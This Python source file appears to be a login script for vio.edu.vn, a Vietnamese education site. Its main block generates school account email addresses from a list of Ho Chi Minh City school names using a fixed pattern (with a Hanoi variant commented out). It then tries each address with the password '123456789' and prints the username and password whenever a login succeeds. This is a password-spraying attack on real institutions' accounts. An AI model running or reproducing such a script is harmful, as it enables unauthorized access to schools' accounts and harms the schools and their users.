# coding=utf-8
import json
import logging

__author__ = 'ThucNC'

import requests
from unidecode import unidecode

from ucode.helpers.clog import CLog

_logger = logging.getLogger(__name__)


class Vio:
    def __init__(self):
        self.s = requests.session()

    def login(self, username, password):
        url = "https://vio.edu.vn/login"
        data = {
            "username": username,
            "password": password
        }
        response = self.s.post(url, json=data)

        if response.status_code == 200:
            CLog.important(f"Login OK: {username} / {password}")
        elif response.status_code == 401:
            CLog.error(f"Login WRONG: {username} / {password}")
        else:
            CLog.error(f"Login FAIL: {username} / {password}")


if __name__ == "__main__":
    vio = Vio()
    schools = """Phan Bội Châu
Lê Anh Xuân
Lê Lợi
Đồng Khởi
Đặng Trần Côn
Võ Thành Trang
Hùng Vương
Tân Thới Hoà
Thoại Ngọc Hầu
Trần Quang Khải
Nguyễn Huệ
Hoàng Diệu
Tôn Thất Tùng"""

    # parttern = "c2%s-dp@hanoiedu.vn"
    parttern = "c2%s-tp@hcmedu.vn"
    for s in schools.split("\n"):
        name = unidecode(s).lower().replace(" ", "")
        vio.login(parttern % name, "123456789")
